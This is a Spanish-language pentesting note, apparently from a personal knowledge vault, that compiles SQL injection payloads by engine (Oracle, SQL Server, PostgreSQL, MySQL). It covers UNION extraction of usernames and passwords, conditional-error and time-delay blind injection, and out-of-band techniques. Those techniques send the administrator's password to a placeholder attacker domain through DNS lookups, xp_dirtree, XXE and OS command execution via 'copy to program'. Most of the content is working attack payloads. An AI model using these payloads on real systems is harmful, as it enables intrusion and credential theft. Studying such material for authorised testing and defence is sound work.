---
type: guía
state: activa
created: 2026-08-23
updated: 2026-08-23
tags: [sql, sqli, oracle, mysql, postgresql, sql-server, payloads, pentesting]
aliases: [SQLi por Motor]
---

# Guía - SQLi por Motor

> [!info] Referencia de payloads
> Compilación de sintaxis y payloads de SQL Injection organizados por motor de base de datos. Índice basado en 1 para todas las funciones de manipulación de cadenas.

---

## 1. Sintaxis y Manipulación de Cadenas

La manipulación precisa de cadenas es el pilar para reconstruir datos o evadir firmas. **Oracle usa `SUBSTR`**, los demás usan `SUBSTRING`.

| Característica | Oracle | SQL Server | PostgreSQL | MySQL |
|----------------|--------|------------|------------|-------|
| Concatenación | `'foo'\|\|'bar'` | `'foo'+'bar'` | `'foo'\|\|'bar'` | `'foo' 'bar'` o `CONCAT('f','o')` |
| Substring (índice 1) | `SUBSTR('str',1,1)` | `SUBSTRING('str',1,1)` | `SUBSTRING('str',1,1)` | `SUBSTRING('str',1,1)` |
| Comentarios | `--comment` | `--comment` o `/* comment */` | `--comment` o `/* comment */` | `#`, `-- ` (con espacio) o `/* */` |

---

## 2. Identificación del Entorno

### Consulta de versión

| Motor | Consulta |
|-------|----------|
| Oracle | `SELECT banner FROM v$version` o `SELECT version FROM v$instance` |
| SQL Server | `SELECT @@version` |
| PostgreSQL | `SELECT version()` |
| MySQL | `SELECT @@version` |

### Enumeración de tablas y columnas

> [!warning] Gotcha de Oracle
> En Oracle, cada `SELECT` debe incluir `FROM`. Para UNION donde no consultamos tabla real, usar `FROM dual`.

**MySQL, SQL Server, PostgreSQL:**
```sql
-- Tablas
SELECT * FROM information_schema.tables
-- Columnas
SELECT * FROM information_schema.columns WHERE table_name = 'USERS'
```

**Oracle:**
```sql
-- Tablas
SELECT * FROM all_tables
-- Columnas
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
```

### Ataque UNION con múltiples valores

Cuando la app solo refleja **una columna**, concatenar campos con delimitador:

```sql
-- Oracle
' UNION SELECT username || '~' || password FROM users--
-- SQL Server
' UNION SELECT username + '~' + password FROM users--
-- MySQL / PostgreSQL
' UNION SELECT CONCAT(username,'~',password) FROM users--
```

---

## 3. Blind SQLi: Errores Condicionales

Forzar errores específicos para confirmar condiciones booleanas cuando no hay salida visible.

### Lógica de errores por motor

```sql
-- Oracle (división por cero)
SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual

-- SQL Server
SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END

-- PostgreSQL
1 = (SELECT CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE NULL END)

-- MySQL (subquery retorna más de 1 fila si condición verdadera)
SELECT IF(1=1,(SELECT table_name FROM information_schema.tables),'a')
```

### Exfiltración vía mensajes verbosos

Forzar que el mensaje de error contenga datos sensibles:

```sql
-- PostgreSQL (CAST falla y revela dato)
SELECT CAST((SELECT password FROM users LIMIT 1) AS int)

-- MySQL (EXTRACTVALUE genera error XPATH con el dato)
SELECT EXTRACTVALUE(1, CONCAT(0x5c, (SELECT password FROM users LIMIT 1)))
```

---

## 4. Retardos de Tiempo (Time-Based Blind)

Cuando no hay respuesta visual ni diferencial de errores, la latencia es el único oráculo.

### Retardo incondicional (10 segundos)

| Motor | Payload |
|-------|---------|
| Oracle | `dbms_pipe.receive_message(('a'),10)` |
| SQL Server | `WAITFOR DELAY '0:0:10'` |
| PostgreSQL | `SELECT pg_sleep(10)` |
| MySQL | `SELECT SLEEP(10)` |

### Retardo condicional

```sql
-- Oracle (concatenar 'a'|| para forzar ejecución dentro del CASE)
SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual

-- SQL Server
IF (1=1) WAITFOR DELAY '0:0:10'

-- PostgreSQL
SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END

-- MySQL
SELECT IF(1=1,SLEEP(10),'a')
```

> [!tip] Reconstrucción completa
> Este método permite reconstruir bases de datos enteras mediante análisis de latencia, pero las técnicas OAST son mucho más eficientes si el entorno lo permite.

---

## 5. Out-of-Band (OAST) y Exfiltración vía DNS

Las técnicas OAST son la cima de la explotación SQLi. No dependen de la respuesta HTTP sino de solicitudes DNS salientes hacia un servidor controlado (ej. Burp Collaborator).

### Confirmación de vulnerabilidad vía DNS

| Motor | Payload |
|-------|---------|
| Oracle | `SELECT UTL_INADDR.get_host_address('tu-subdominio.com')` |
| SQL Server | `exec master..xp_dirtree '//tu-subdominio.com/a'` |
| PostgreSQL | `copy (SELECT '') to program 'nslookup tu-subdominio.com'` |
| MySQL (solo Windows) | `LOAD_FILE('\\\\tu-subdominio.com\\a')` |

### Exfiltración de datos vía DNS

**Oracle (vía XMLType):**
```sql
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users
    WHERE username='administrator')||'.tu-subdominio.com/"> %remote;
]>'),'/l') FROM dual
```

**SQL Server:**
```sql
declare @p varchar(1024);
set @p=(SELECT password FROM users WHERE username='administrator');
exec('master..xp_dirtree "//'+@p+'.tu-subdominio.com/a"')
```

**PostgreSQL (vía PL/pgSQL):**
```sql
CREATE OR REPLACE FUNCTION f() RETURNS void AS $$
DECLARE p text;
BEGIN
    SELECT INTO p (SELECT password FROM users WHERE username='administrator');
    EXECUTE 'copy (SELECT '''') to program ''nslookup ' || p || '.tu-subdominio.com''';
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
SELECT f();
```

**MySQL (solo Windows):**
```sql
SELECT password INTO OUTFILE '\\\\administrator-password.tu-subdominio.com\\a'
FROM users WHERE username='administrator'
```

---

## Referencia
- [[40 - RECURSOS/Conceptos/SQL-Injection]]
- [[40 - RECURSOS/Conceptos/OAST]]
- [[40 - RECURSOS/Conceptos/Injection]]
- [[40 - RECURSOS/MOCs/MOC - Pentesting]]
- [[40 - RECURSOS/MOCs/MOC - Seguridad]]

#sql #sqli #oracle #mysql #postgresql #sql-server #payloads #pentesting
